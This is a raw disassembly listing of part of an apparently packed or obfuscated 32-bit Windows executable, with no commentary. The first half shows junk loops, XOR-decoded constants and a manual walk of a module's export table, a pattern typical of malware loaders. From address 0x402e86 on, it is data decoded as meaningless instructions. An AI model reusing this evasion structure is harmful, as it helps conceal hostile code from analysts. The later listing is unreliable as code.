  4026ca:	add    al,0xc
  4026cc:	xor    al,0x70
  4026ce:	cmp    al,0x29
  4026d0:	mov    DWORD PTR ds:0x413cf0,0x3ac2
  4026da:	jne    0x402787
  4026e0:	add    edx,DWORD PTR ds:0x41401c
  4026e6:	mov    eax,DWORD PTR [ebp+0x8]
  4026e9:	and    DWORD PTR ds:0x413c84,0x0
  4026f3:	jmp    0x402707
  4026f8:	xor    edx,edx
  4026fa:	xor    edx,DWORD PTR ds:0x413c84
  402700:	inc    edx
  402701:	mov    DWORD PTR ds:0x413c84,edx
  402707:	cmp    DWORD PTR ds:0x413c84,0x12
  40270e:	jae    0x40274b
  402714:	cmp    DWORD PTR ds:0x413c84,0x7
  40271b:	jne    0x40272c
  402721:	push   0x4160b3
  402726:	call   DWORD PTR ds:0x41677c
  40272c:	cmp    DWORD PTR ds:0x413c84,0x6
  402733:	jne    0x402746
  402739:	mov    edx,DWORD PTR ds:0x413c84
  40273f:	inc    edx
  402740:	mov    DWORD PTR ds:0x413c84,edx
  402746:	jmp    0x4026f8
  40274b:	mov    ecx,DWORD PTR [ebp+0x8]
  40274e:	add    ecx,DWORD PTR [eax+0x3c]
  402751:	mov    edx,0x7510894
  402756:	mov    DWORD PTR [ebp+0x8],ecx
  402759:	mov    eax,DWORD PTR [ebp-0x4]
  40275c:	xor    eax,edx
  40275e:	push   esi
  40275f:	mov    esi,DWORD PTR [ebp+0x8]
  402762:	mov    ecx,0x3272dc
  402767:	add    eax,ecx
  402769:	cmp    DWORD PTR [esi+0x54],eax
  40276c:	pop    esi
  40276d:	je     0x40277b
  402773:	mov    eax,DWORD PTR [ebp+0x8]
  402776:	jmp    0x402794
  40277b:	mov    eax,DWORD PTR [ebp-0x4]
  40277e:	xor    eax,edx
  402780:	add    eax,ecx
  402782:	jmp    0x402794
  402787:	mov    eax,DWORD PTR [ebp-0x4]
  40278a:	xor    eax,0x7510894
  40278f:	add    eax,0x3272dc
  402794:	leave  
  402795:	ret    0x4
  402798:	push   ebp
  402799:	mov    ebp,esp
  40279b:	sub    esp,0x78
  40279e:	xor    DWORD PTR ds:0x413c1e,0x50b0
  4027a8:	push   ebx
  4027a9:	adc    DWORD PTR ds:0x413d30,0x7f7d
  4027b3:	push   esi
  4027b4:	add    DWORD PTR ds:0x413d30,0x413cf0
  4027be:	push   edi
  4027bf:	push   0x1f
  4027c1:	and    DWORD PTR ds:0x413bf6,0x413c80
  4027cb:	lea    eax,[ebp-0x78]
  4027ce:	push   eax
  4027cf:	push   0x0
  4027d1:	adc    DWORD PTR ds:0x413d34,0x413c80
  4027db:	call   DWORD PTR ds:0x41676c
  4027e1:	push   0x97898797
  4027e6:	call   DWORD PTR ds:0x416754
  4027ec:	sub    ecx,ecx
  4027ee:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  4027f5:	xor    DWORD PTR ds:0x414008,0x58a1
  4027ff:	mov    DWORD PTR [ebp-0x14],0xf89c85b1
  402806:	mov    ecx,DWORD PTR [ebp-0x4]
  402809:	mov    ebx,0x7510894
  40280e:	xor    ecx,ebx
  402810:	mov    eax,0x3272dc
  402815:	xor    DWORD PTR ds:0x413c6c,0x3fbb
  40281f:	add    ecx,eax
  402821:	mov    DWORD PTR [ebp-0x1c],ecx
  402824:	sbb    DWORD PTR ds:0x413d34,edi
  40282a:	mov    ecx,DWORD PTR [ebp+0x14]
  40282d:	test   ecx,ecx
  40282f:	je     0x402847
  402835:	mov    ecx,DWORD PTR [ebp+0x14]
  402838:	mov    ecx,DWORD PTR [ecx]
  40283a:	or     DWORD PTR ds:0x413c0a,0x414000
  402844:	mov    DWORD PTR [ebp-0x1c],ecx
  402847:	mov    DWORD PTR ds:0x413d34,0x1f
  402851:	cmp    DWORD PTR ds:0x413d34,0x0
  402858:	je     0x40288f
  40285e:	cmp    DWORD PTR ds:0x413d34,0x22
  402865:	jne    0x40287d
  40286b:	push   0x414010
  402870:	push   0x0
  402872:	push   0x416017
  402877:	call   DWORD PTR ds:0x416780
  40287d:	mov    ecx,DWORD PTR ds:0x413d34
  402883:	dec    ecx
  402884:	mov    DWORD PTR ds:0x413d34,ecx
  40288a:	jmp    0x402851
  40288f:	mov    ecx,0x7665
  402894:	sbb    edi,edi
  402896:	imul   edx,eax
  402899:	and    DWORD PTR ds:0x413c80,0x0
  4028a3:	mov    esi,DWORD PTR ds:0x413c80
  4028a9:	inc    esi
  4028aa:	mov    DWORD PTR ds:0x413c80,esi
  4028b0:	cmp    DWORD PTR ds:0x413c80,0xc
  4028b7:	jne    0x4028cb
  4028bd:	push   0x413ce4
  4028c2:	push   DWORD PTR [ebp-0x20]
  4028c5:	call   DWORD PTR ds:0x416784
  4028cb:	cmp    DWORD PTR ds:0x413c80,0xb
  4028d2:	jne    0x4028e5
  4028d8:	mov    esi,DWORD PTR ds:0x413c80
  4028de:	inc    esi
  4028df:	mov    DWORD PTR ds:0x413c80,esi
  4028e5:	cmp    DWORD PTR ds:0x413c80,0x1c
  4028ec:	jb     0x4028a3
  4028f2:	mov    esi,0x76532
  4028f7:	mov    DWORD PTR ds:0x413d30,0x639a
  402901:	add    edx,ecx
  402903:	movzx  edi,BYTE PTR ds:0x413ce4
  40290a:	and    DWORD PTR ds:0x413bfe,edi
  402910:	xchg   esi,ecx
  402912:	sbb    DWORD PTR ds:0x413c80,edi
  402918:	mov    edi,0x54354
  40291d:	mov    DWORD PTR ds:0x413d34,0x5e6f
  402927:	sub    edx,edi
  402929:	mov    ecx,DWORD PTR [ebp-0x4]
  40292c:	xor    ecx,ebx
  40292e:	mov    DWORD PTR ds:0x413c70,0x13
  402938:	cmp    DWORD PTR ds:0x413c70,0x0
  40293f:	je     0x40299c
  402945:	cmp    DWORD PTR ds:0x413c70,0x5
  40294c:	jne    0x402962
  402952:	push   0x7f69
  402957:	push   0x41606e
  40295c:	call   DWORD PTR ds:0x41678c
  402962:	cmp    DWORD PTR ds:0x413c70,0x6
  402969:	jne    0x40297c
  40296f:	mov    esi,DWORD PTR ds:0x413c70
  402975:	dec    esi
  402976:	mov    DWORD PTR ds:0x413c70,esi
  40297c:	mov    esi,DWORD PTR ds:0x413c70
  402982:	dec    esi
  402983:	mov    DWORD PTR ds:0x413c70,esi
  402989:	jmp    0x402938
  40298e:	mov    esi,DWORD PTR ds:0x413cb0
  402994:	mov    esi,DWORD PTR [esi]
  402996:	adc    DWORD PTR ds:0x414008,esi
  40299c:	add    ecx,eax
  40299e:	mov    DWORD PTR [ebp-0x8],ecx
  4029a1:	sub    ecx,ecx
  4029a3:	mov    ecx,DWORD PTR [ebp-0x14]
  4029a6:	sub    DWORD PTR ds:0x413c80,ebx
  4029ac:	xor    ecx,ebx
  4029ae:	add    ecx,eax
  4029b0:	mov    DWORD PTR [ebp-0x24],ecx
  4029b3:	sub    ecx,0x1ce
  4029b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4029bc:	mov    esi,DWORD PTR ds:0x413c1a
  4029c2:	xor    DWORD PTR ds:0x413d1c,esi
  4029c8:	xor    ecx,ebx
  4029ca:	add    ecx,eax
  4029cc:	add    DWORD PTR ds:0x413d34,edi
  4029d2:	mov    DWORD PTR [ebp-0x30],ecx
  4029d5:	movzx  esi,BYTE PTR ds:0x414010
  4029dc:	sbb    esi,DWORD PTR ds:0x413bfe
  4029e2:	mov    DWORD PTR ds:0x414010,esi
  4029e8:	mov    esi,DWORD PTR [ebp-0x4]
  4029eb:	adc    ecx,DWORD PTR ds:0x413c16
  4029f1:	xor    esi,ebx
  4029f3:	xor    DWORD PTR ds:0x41401c,ecx
  4029f9:	add    esi,eax
  4029fb:	and    DWORD PTR ds:0x413c84,0x0
  402a05:	jmp    0x402a17
  402a0a:	mov    ecx,DWORD PTR ds:0x413c84
  402a10:	inc    ecx
  402a11:	mov    DWORD PTR ds:0x413c84,ecx
  402a17:	cmp    DWORD PTR ds:0x413c84,0x19
  402a1e:	jae    0x402af3
  402a24:	cmp    DWORD PTR ds:0x413c84,0xd
  402a2b:	jne    0x402a51
  402a31:	push   0x7c39
  402a36:	push   0x413c1e
  402a3b:	push   0x8717
  402a40:	push   0x416025
  402a45:	push   DWORD PTR [ebp-0x28]
  402a48:	push   DWORD PTR [ebp-0x10]
  402a4b:	call   DWORD PTR ds:0x416790
  402a51:	cmp    DWORD PTR ds:0x413c84,0xc
  402a58:	jne    0x402a6b
  402a5e:	mov    ecx,DWORD PTR ds:0x413c84
  402a64:	inc    ecx
  402a65:	mov    DWORD PTR ds:0x413c84,ecx
  402a6b:	jmp    0x402a0a
  402a70:	mov    DWORD PTR ds:0x413d30,0x12
  402a7a:	cmp    DWORD PTR ds:0x413d30,0x0
  402a81:	je     0x402af3
  402a87:	cmp    DWORD PTR ds:0x413d30,0x21
  402a8e:	jne    0x402a9f
  402a94:	push   0x1529
  402a99:	call   DWORD PTR ds:0x416798
  402a9f:	mov    ecx,DWORD PTR ds:0x413d30
  402aa5:	dec    ecx
  402aa6:	mov    DWORD PTR ds:0x413d30,ecx
  402aac:	jmp    0x402a7a
  402ab1:	and    DWORD PTR ds:0x413d34,0x0
  402abb:	mov    ecx,DWORD PTR ds:0x413d34
  402ac1:	inc    ecx
  402ac2:	mov    DWORD PTR ds:0x413d34,ecx
  402ac8:	cmp    DWORD PTR ds:0x413d34,0x29
  402acf:	jne    0x402ae0
  402ad5:	push   0x413c12
  402ada:	call   DWORD PTR ds:0x41679c
  402ae0:	cmp    DWORD PTR ds:0x413d34,0x19
  402ae7:	jb     0x402abb
  402aed:	or     ecx,DWORD PTR ds:0x413c0a
  402af3:	mov    ecx,DWORD PTR [ebp-0x24]
  402af6:	or     DWORD PTR ds:0x413c88,0x413c12
  402b00:	sub    ecx,eax
  402b02:	add    DWORD PTR ds:0x413c1e,0x57cd
  402b0c:	lea    edx,[esi-0x3272dc]
  402b12:	xor    ecx,ebx
  402b14:	and    DWORD PTR ds:0x413ce8,0xb77
  402b1e:	xor    edx,ebx
  402b20:	mov    DWORD PTR ds:0x413bfe,0x29ac
  402b2a:	cmp    edx,ecx
  402b2c:	mov    DWORD PTR ds:0x413ce4,0x2b4b
  402b36:	je     0x402e02
  402b3c:	sub    ecx,DWORD PTR ds:0x413d34
  402b42:	mov    ecx,DWORD PTR [ebp-0x4]
  402b45:	xor    DWORD PTR ds:0x413bfe,0x413c84
  402b4f:	xor    ecx,ebx
  402b51:	adc    DWORD PTR ds:0x413bf6,0x7b2
  402b5b:	add    ecx,eax
  402b5d:	cmp    esi,ecx
  402b5f:	jne    0x402ddf
  402b65:	or     DWORD PTR ds:0x413cf0,0x413c1e
  402b6f:	push   DWORD PTR [ebp+0x8]
  402b72:	call   0x4026a6
  402b77:	mov    DWORD PTR ds:0x414004,0x1c
  402b81:	cmp    DWORD PTR ds:0x414004,0x0
  402b88:	je     0x402bc3
  402b8e:	cmp    DWORD PTR ds:0x414004,0x2b
  402b95:	jne    0x402ba9
  402b9b:	push   0x413c6c
  402ba0:	push   DWORD PTR [ebp-0x24]
  402ba3:	call   DWORD PTR ds:0x41675c
  402ba9:	xor    ecx,ecx
  402bab:	or     ecx,DWORD PTR ds:0x414004
  402bb1:	dec    ecx
  402bb2:	mov    DWORD PTR ds:0x414004,ecx
  402bb8:	jmp    0x402b81
  402bbd:	sbb    DWORD PTR ds:0x413d34,ecx
  402bc3:	mov    DWORD PTR [ebp-0x18],eax
  402bc6:	and    DWORD PTR ds:0x413d28,0x0
  402bd0:	jmp    0x402be2
  402bd5:	mov    ecx,DWORD PTR ds:0x413d28
  402bdb:	inc    ecx
  402bdc:	mov    DWORD PTR ds:0x413d28,ecx
  402be2:	cmp    DWORD PTR ds:0x413d28,0x16
  402be9:	jae    0x402c2e
  402bef:	cmp    DWORD PTR ds:0x413d28,0x5
  402bf6:	jne    0x402c0f
  402bfc:	push   DWORD PTR [ebp-0x10]
  402bff:	push   0x41400c
  402c04:	push   0x2409
  402c09:	call   DWORD PTR ds:0x416760
  402c0f:	cmp    DWORD PTR ds:0x413d28,0x4
  402c16:	jne    0x402c29
  402c1c:	mov    ecx,DWORD PTR ds:0x413d28
  402c22:	inc    ecx
  402c23:	mov    DWORD PTR ds:0x413d28,ecx
  402c29:	jmp    0x402bd5
  402c2e:	mov    eax,DWORD PTR [ebp-0x4]
  402c31:	sub    DWORD PTR ds:0x413ce4,0x168d
  402c3b:	mov    ecx,DWORD PTR [ebp-0x18]
  402c3e:	inc    edi
  402c3f:	xor    eax,ebx
  402c41:	and    DWORD PTR ds:0x413c88,0x0
  402c4b:	jmp    0x402c5d
  402c50:	mov    edi,DWORD PTR ds:0x413c88
  402c56:	inc    edi
  402c57:	mov    DWORD PTR ds:0x413c88,edi
  402c5d:	cmp    DWORD PTR ds:0x413c88,0x1c
  402c64:	jae    0x402ca8
  402c6a:	cmp    DWORD PTR ds:0x413c88,0x5
  402c71:	jne    0x402c89
  402c77:	push   DWORD PTR [ebp-0xc]
  402c7a:	push   DWORD PTR [ebp-0x10]
  402c7d:	push   DWORD PTR [ebp-0x28]
  402c80:	push   DWORD PTR [ebp-0xc]
  402c83:	call   DWORD PTR ds:0x416764
  402c89:	cmp    DWORD PTR ds:0x413c88,0x4
  402c90:	jne    0x402ca3
  402c96:	mov    edi,DWORD PTR ds:0x413c88
  402c9c:	inc    edi
  402c9d:	mov    DWORD PTR ds:0x413c88,edi
  402ca3:	jmp    0x402c50
  402ca8:	mov    edi,0x3272dc
  402cad:	sbb    DWORD PTR ds:0x414008,0x338e
  402cb7:	add    eax,edi
  402cb9:	cmp    ecx,eax
  402cbb:	mov    DWORD PTR ds:0x413bfe,0x2c9f
  402cc5:	je     0x402e72
  402ccb:	adc    DWORD PTR ds:0x413c74,0x2cc9
  402cd5:	push   DWORD PTR [ebp-0x18]
  402cd8:	add    DWORD PTR ds:0x413c74,0x6616
  402ce2:	push   DWORD PTR [ebp+0x8]
  402ce5:	neg    DWORD PTR ds:0x413d2c
  402ceb:	call   0x407cf9
  402cf0:	mov    DWORD PTR [ebp-0x18],eax
  402cf3:	xor    DWORD PTR ds:0x413c12,ebx
  402cf9:	mov    eax,DWORD PTR [ebp-0x4]
  402cfc:	add    DWORD PTR ds:0x414008,edx
  402d02:	mov    ecx,DWORD PTR [ebp-0x18]
  402d05:	sub    DWORD PTR ds:0x413cdc,0x28ac
  402d0f:	xor    eax,ebx
  402d11:	sub    DWORD PTR ds:0x41400c,0x413ce4
  402d1b:	add    eax,edi
  402d1d:	cmp    ecx,eax
  402d1f:	je     0x402e72
  402d25:	or     DWORD PTR ds:0x414014,edi
  402d2b:	mov    eax,DWORD PTR [ebp-0x18]
  402d2e:	mov    ecx,DWORD PTR ds:0x414008
  402d34:	adc    ecx,DWORD PTR ds:0x413c7c
  402d3a:	mov    DWORD PTR ds:0x414008,ecx
  402d40:	mov    eax,DWORD PTR [eax+0x18]
  402d43:	mov    ecx,DWORD PTR ds:0x413ca4
  402d49:	mov    ecx,DWORD PTR [ecx]
  402d4b:	and    DWORD PTR ds:0x413d28,ecx
  402d51:	mov    DWORD PTR [ebp-0x24],eax
  402d54:	and    DWORD PTR ds:0x413c70,0x0
  402d5e:	mov    ecx,DWORD PTR ds:0x413c70
  402d64:	inc    ecx
  402d65:	mov    DWORD PTR ds:0x413c70,ecx
  402d6b:	cmp    DWORD PTR ds:0x413c70,0xf
  402d72:	jne    0x402d8d
  402d78:	push   0x2d13
  402d7d:	push   0x29b5
  402d82:	push   0x400000
  402d87:	call   DWORD PTR ds:0x416768
  402d8d:	cmp    DWORD PTR ds:0x413c70,0xe
  402d94:	jne    0x402da7
  402d9a:	mov    ecx,DWORD PTR ds:0x413c70
  402da0:	inc    ecx
  402da1:	mov    DWORD PTR ds:0x413c70,ecx
  402da7:	cmp    DWORD PTR ds:0x413c70,0x18
  402dae:	jb     0x402d5e
  402db4:	mov    eax,DWORD PTR [ebp-0x18]
  402db7:	mov    ecx,DWORD PTR [ebp+0x8]
  402dba:	add    ecx,DWORD PTR [eax+0x20]
  402dbd:	mov    DWORD PTR [ebp-0x2c],ecx
  402dc0:	mov    eax,DWORD PTR [ebp-0x18]
  402dc3:	mov    ecx,DWORD PTR [ebp+0x8]
  402dc6:	add    ecx,DWORD PTR [eax+0x24]
  402dc9:	mov    DWORD PTR [ebp-0x34],ecx
  402dcc:	mov    eax,DWORD PTR [ebp-0x18]
  402dcf:	mov    ecx,DWORD PTR [ebp+0x8]
  402dd2:	add    ecx,DWORD PTR [eax+0x1c]
  402dd5:	mov    eax,edi
  402dd7:	mov    DWORD PTR [ebp-0x18],ecx
  402dda:	jmp    0x402e3a
  402ddf:	mov    ecx,DWORD PTR [ebp-0x2c]
  402de2:	mov    edx,DWORD PTR [ebp+0x8]
  402de5:	add    edx,DWORD PTR [ecx+esi*4]
  402de8:	mov    DWORD PTR [ebp-0x28],edx
  402deb:	mov    ecx,DWORD PTR [ebp-0x4]
  402dee:	mov    edx,DWORD PTR [ebp-0x28]
  402df1:	xor    ecx,ebx
  402df3:	add    ecx,eax
  402df5:	cmp    edx,ecx
  402df7:	je     0x402e3a
  402dfd:	jmp    0x402e26
  402e02:	mov    ecx,DWORD PTR [ebp-0x4]
  402e05:	mov    edx,DWORD PTR [ebp-0x8]
  402e08:	xor    ecx,ebx
  402e0a:	add    ecx,eax
  402e0c:	cmp    edx,ecx
  402e0e:	je     0x402e7e
  402e14:	mov    ecx,DWORD PTR [ebp-0x4]
  402e17:	mov    edx,DWORD PTR [ebp-0x30]
  402e1a:	xor    ecx,ebx
  402e1c:	add    ecx,eax
  402e1e:	cmp    edx,ecx
  402e20:	je     0x40522e
  402e26:	lea    eax,[ebp-0x8]
  402e29:	push   eax
  402e2a:	push   DWORD PTR [ebp-0x28]
  402e2d:	push   DWORD PTR [ebp+0xc]
  402e30:	call   0x40a47a
  402e35:	mov    eax,0x3272dc
  402e3a:	mov    ecx,DWORD PTR [ebp-0x4]
  402e3d:	mov    edx,DWORD PTR [ebp-0x8]
  402e40:	xor    ecx,ebx
  402e42:	add    ecx,eax
  402e44:	cmp    edx,ecx
  402e46:	je     0x402e61
  402e4c:	mov    ecx,DWORD PTR [ebp-0x34]
  402e4f:	movzx  ecx,WORD PTR [ecx+esi*2]
  402e53:	mov    edx,DWORD PTR [ebp-0x18]
  402e56:	mov    ecx,DWORD PTR [edx+ecx*4]
  402e59:	mov    DWORD PTR [ebp-0x38],ecx
  402e5c:	jmp    0x402e02
  402e61:	mov    ecx,DWORD PTR [ebp-0x14]
  402e64:	xor    ecx,ebx
  402e66:	lea    esi,[esi+ecx*1+0x3272dc]
  402e6d:	jmp    0x4029fb
  402e72:	mov    eax,DWORD PTR [ebp-0x4]
  402e75:	xor    eax,ebx
  402e77:	add    eax,edi
  402e79:	jmp    0x405392
  402e7e:	mov    eax,DWORD PTR [ebp-0x4]
  402e81:	jmp    0x405222
  402e86:	or     al,0xe7
  402e88:	xchg   BYTE PTR [ebx-0x240e7489],cl
  402e8e:	xchg   bl,cl
  402e90:	pushf  
  402e91:	cmp    DWORD PTR [ebx+0x7c166c85],eax
  402e97:	jl     0x402f15
  402e99:	jl     0x402e7b
  402e9b:	pop    edi
  402e9c:	jl     0x402f1a
  402e9e:	adc    eax,0x1921172e
  402ea3:	and    eax,0x38652f1b
  402ea8:	imul   ebp,DWORD PTR [eax-0x9],0x6d6c6c62
  402eaf:	xor    al,0xc5
  402eb1:	fsubrp st(1),st
  402eb3:	push   edx
  402eb4:	dec    edx
  402eb5:	imul   esp,DWORD PTR [ecx+0x5b],0xffffff92
  402eb9:	bound  ebp,QWORD PTR [ebp+0x59]
  402ebc:	iret   
  402ebd:	pop    ebp
  402ebe:	dec    esp
  402ebf:	and    cl,BYTE PTR [esi+0x577887fc]
  402ec5:	dec    ebp
  402ec6:	jg     0x402eff
  402ec8:	jb     0x402e72
  402eca:	jg     0x402e6e
  402ecc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ecd:	cmp    ebp,DWORD PTR [esi]
  402ecf:	jmp    FWORD PTR [eax-0x22]
  402ed2:	cld    
  402ed3:	push   ebx
  402ed4:	jg     0x402ed6
  402ed6:	in     eax,dx
  402ed7:	cmp    ebp,ecx
  402ed9:	mov    esp,0xc01387ed
  402ede:	mov    ebp,DWORD PTR [ecx]
  402ee0:	mulps  xmm5,XMMWORD PTR [ebx+0x6df7c68c]
  402ee7:	fld    QWORD PTR [esi]
  402ee9:	(bad)  
  402eea:	lock cld 
  402eec:	sub    BYTE PTR [edx],bl
  402eee:	dec    edx
  402eef:	push   cs
  402ef0:	sub    BYTE PTR [ebx+0x6a],ch
  402ef3:	mov    ecx,0x54113af
  402ef8:	test   al,0xff
  402efa:	jmp    0x34b65a48
  402eff:	retf   0xf95b
  402f02:	sbb    al,0xfc
  402f04:	jp     0x402ea7
  402f06:	arpl   bp,bx
  402f08:	call   0x8416:0x7a18b5f
  402f0f:	xor    ebx,esi
  402f11:	cmp    BYTE PTR [esi],0x74
  402f14:	jae    0x402f21
  402f16:	fsubr  QWORD PTR ds:0x33368d54
  402f1c:	push   esi
  402f1d:	jecxz  0x402eee
  402f1f:	mov    WORD PTR [ecx],gs
  402f21:	mov    DWORD PTR [edx+0x518aceb7],esi
  402f27:	out    0x45,al
  402f29:	push   esp
  402f2a:	dec    esi
  402f2b:	push   cs
  402f2c:	and    bl,dh
  402f2e:	cmp    BYTE PTR [ebx],al
  402f30:	lods   eax,DWORD PTR ds:[esi]
  402f31:	dec    ebx
  402f32:	int3   
  402f33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f34:	xor    al,dl
  402f36:	push   es
  402f37:	pop    eax
  402f38:	std    
  402f39:	push   esp
  402f3a:	pop    eax
  402f3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f3c:	stc    
  402f3d:	push   0xffffffbf
  402f3f:	cli    
  402f40:	inc    esp
  402f41:	sbb    BYTE PTR [esi],dh
  402f43:	mov    ds:0xc3e6ffc1,al
  402f48:	or     BYTE PTR [ebp-0x1df8968f],0x65
  402f4f:	stos   DWORD PTR es:[edi],eax
  402f50:	push   ds
  402f51:	mov    dl,0x89
  402f53:	mov    eax,0xb12f6fd6
  402f58:	mov    esp,0x173bd3a3
  402f5d:	mov    esi,DWORD PTR [ebx]
  402f5f:	jmp    0x402f28
  402f61:	js     0x402f22
  402f63:	push   esi
  402f64:	call   0xfcfb:0x7715e0f4
  402f6b:	pop    esp
  402f6c:	repz push esi
  402f6e:	sbb    bl,ah
  402f70:	sbb    al,0xf3
  402f72:	jo     0x402f64
  402f74:	and    esi,esp
  402f76:	push   es
  402f77:	sar    BYTE PTR [ecx-0x2df367ea],1
  402f7d:	jb     0x402f8d
  402f7f:	xor    ecx,DWORD PTR [eax]
  402f81:	outs   dx,BYTE PTR ds:[esi]
  402f82:	int3   
  402f83:	jp     0x402f24
  402f85:	mov    DWORD PTR [eax-0x6d],ebx
  402f88:	ins    BYTE PTR es:[edi],dx
  402f89:	add    BYTE PTR [esi+0x4bb60582],0xdc
  402f90:	aam    0x1
  402f92:	outs   dx,BYTE PTR ds:[esi]
  402f93:	lock ss sub eax,0xd8c69669
  402f9a:	bound  esi,QWORD PTR [edx]
  402f9c:	xor    eax,0xab1632e2
  402fa1:	or     al,0x39
  402fa3:	fwait
  402fa4:	rcr    DWORD PTR [edi-0x26],1
  402fa7:	imul   esi,DWORD PTR [edi+0x27c05468],0x37191bd8
  402fb1:	imul   esp,DWORD PTR [ebx+0x694a6a81],0x5a
  402fb8:	or     esi,0x93e56c10
  402fbe:	sbb    eax,0xe628600b
  402fc3:	mov    dh,0x8f
  402fc5:	out    dx,eax
  402fc6:	jnp    0x402f65
  402fc8:	sub    DWORD PTR [ebx-0x1c],edx
  402fcb:	int    0x79
  402fcd:	cmc    
  402fce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fcf:	add    DWORD PTR [ebx+0x1bfd9c39],esi
  402fd5:	xchg   ebp,eax
  402fd6:	mov    eax,0xf73ac6e1
  402fdb:	mov    esi,0xed190f5a
  402fe0:	inc    esi
  402fe1:	jo     0x40304a
  402fe3:	inc    edx
  402fe4:	cs sub al,0x31
  402fe7:	sbb    DWORD PTR [edi],ecx
  402fe9:	xor    edi,ebx
  402feb:	cmc    
  402fec:	pop    eax
  402fed:	sbb    DWORD PTR [eax+0x1eeb88ab],eax
  402ff3:	ins    BYTE PTR es:[edi],dx
  402ff4:	pushf  
  402ff5:	dec    ecx
  402ff6:	jb     0x403010
  402ff8:	icebp  
  402ff9:	jl     0x403060
  402ffb:	cmp    bl,BYTE PTR [edi]
  402ffd:	rol    BYTE PTR ds:0x5face5c3,0xd4
  403004:	xchg   esi,eax
  403005:	dec    edx
  403006:	and    ecx,esp
  403008:	aad    0x9a
  40300a:	dec    esp
  40300b:	loopne 0x403055
  40300d:	test   al,0xc3
  40300f:	mov    esp,0x114858c5
  403014:	(bad)  
  403015:	pmulhuw mm2,QWORD PTR ss:[esi+0x70]
  40301a:	fnstsw WORD PTR [edx-0x5e]
  40301d:	cmp    al,0xf
  40301f:	jae    0x402fa3
  403021:	xor    ecx,DWORD PTR [esi+0x17ed989]
  403027:	fs jno 0x403022
  40302a:	cmp    BYTE PTR [eax],cl
  40302c:	daa    
  40302d:	pop    ecx
  40302e:	enter  0x84bf,0xfb
  403032:	ds jmp 0x6ae8a43
  403038:	or     al,0xb2
  40303a:	cmp    eax,0x47f96d58
  40303f:	bound  ecx,QWORD PTR [ebx]
  403041:	rcl    DWORD PTR [edx-0xe],cl
  403044:	jne    0x4030c5
  403046:	add    eax,0x1649f08a
  40304b:	add    DWORD PTR ds:0xec0b806f,ebx
  403051:	cli    
  403052:	(bad)  
  403053:	cmp    eax,0x88637c1b
  403058:	stos   DWORD PTR es:[edi],eax
  403059:	or     eax,0xd89d6179
  40305e:	pop    esi
  40305f:	ret    
  403060:	sbb    al,dh
  403062:	dec    esi
  403063:	mov    al,ds:0x764d8376
  403068:	into   
  403069:	int3   
  40306a:	xchg   DWORD PTR [ebx-0x63],eax
  40306d:	(bad)  
  40306e:	jne    0x4030b0
  403070:	(bad)  
  403071:	ins    DWORD PTR es:[edi],dx
  403072:	mov    dl,0xa5
  403074:	stos   DWORD PTR es:[edi],eax
  403075:	xchg   ebp,eax
  403076:	cli    
  403077:	inc    esp
  403078:	scas   eax,DWORD PTR es:[edi]
  403079:	dec    edx
  40307a:	mov    edx,0xe4bd4175
  40307f:	mov    ah,0x30
  403081:	cmp    BYTE PTR [ecx-0xabee86e],0x98
  403088:	cmp    eax,0xa935db13
  40308d:	int3   
  40308e:	loop   0x403011
  403090:	xchg   esi,eax
  403091:	jg     0x40309c
  403093:	clc    
  403094:	or     BYTE PTR [ecx+0x43fbefa7],ch
  40309a:	test   bl,ch
  40309c:	cs repz ja 0x4030d5
  4030a0:	neg    DWORD PTR [esi]
  4030a2:	popa   
  4030a3:	pushf  
  4030a4:	add    bl,BYTE PTR [esi+edx*8+0x7f]
  4030a8:	sub    DWORD PTR ds:0xd6a059dd,ebx
  4030ae:	cmp    eax,0x9a56343a
  4030b3:	push   esp
  4030b4:	mov    bl,0x64
  4030b6:	call   0x9b1da30a
  4030bb:	in     eax,0xb0
  4030bd:	push   0xace8952c
  4030c2:	(bad)  
  4030c3:	jle    0x40307d
  4030c5:	aas    
  4030c6:	retf   
  4030c7:	std    
  4030c8:	into   
  4030c9:	xchg   edx,esp
  4030cb:	sbb    bl,ch
  4030cd:	cmp    eax,0xa4e5c33f
  4030d2:	and    al,0x7b
  4030d4:	scas   eax,DWORD PTR es:[edi]
  4030d5:	or     DWORD PTR [eax+eiz*1],esp
  4030d8:	enter  0x67ce,0xac
  4030dc:	mov    ch,0x6e
  4030de:	add    eax,0x63c142eb
  4030e3:	add    DWORD PTR [esi+ecx*1],ebx
  4030e6:	cmc    
  4030e7:	lock add BYTE PTR [ebp+0x73],dh
  4030eb:	lods   al,BYTE PTR ds:[esi]
  4030ec:	iret   
  4030ed:	cmc    
  4030ee:	fstp   DWORD PTR [ecx-0x54ddb0f2]
  4030f4:	mov    edx,0xc06499
  4030f9:	test   DWORD PTR [edx],edi
  4030fb:	retf   
  4030fc:	add    eax,0xd22e7f54
  403101:	sbb    al,0xa
  403103:	aam    0xb
  403105:	div    BYTE PTR [eax-0x4b]
  403108:	in     al,0xb0
  40310a:	jmp    DWORD PTR [ebx-0x5b]
  40310d:	cli    
  40310e:	in     eax,0x82
  403110:	shl    BYTE PTR ss:[edx],1
  403113:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403114:	sub    al,0x74
  403116:	mov    edx,0x4b0512d
  40311b:	push   eax
  40311c:	dec    ebx
  40311d:	adc    DWORD PTR [esp+edx*8+0x38],edi
  403121:	adc    al,0xb3
  403123:	xchg   BYTE PTR [bx+di-0x5999],ch
  403128:	fdivr  DWORD PTR [ebx]
  40312a:	(bad)
  40312e:	lahf   
  40312f:	pop    eax
  403130:	out    0x36,eax
  403132:	jmp    0x41bd6905
  403137:	sbb    ecx,DWORD PTR [edi-0x40d5dd45]
  40313d:	pop    ecx
  40313e:	lods   eax,DWORD PTR ds:[esi]
  40313f:	adc    BYTE PTR [ebp+0x70],ah
  403142:	retf   
  403143:	(bad)  
  403145:	shl    DWORD PTR [edi-0x2494248b],1
  40314b:	xlat   BYTE PTR ds:[ebx]
  40314c:	in     al,0x5a
  40314e:	inc    esi
  40314f:	or     BYTE PTR [ebp+0x3],al
  403152:	test   eax,0xb443603
  403157:	xor    esp,DWORD PTR [esi+edi*8-0x3b]
  40315b:	addr16 or al,0x11
  40315e:	dec    edi
  40315f:	xor    DWORD PTR [edx-0x10],eax
  403162:	fistp  QWORD PTR [ebx]
  403164:	in     al,dx
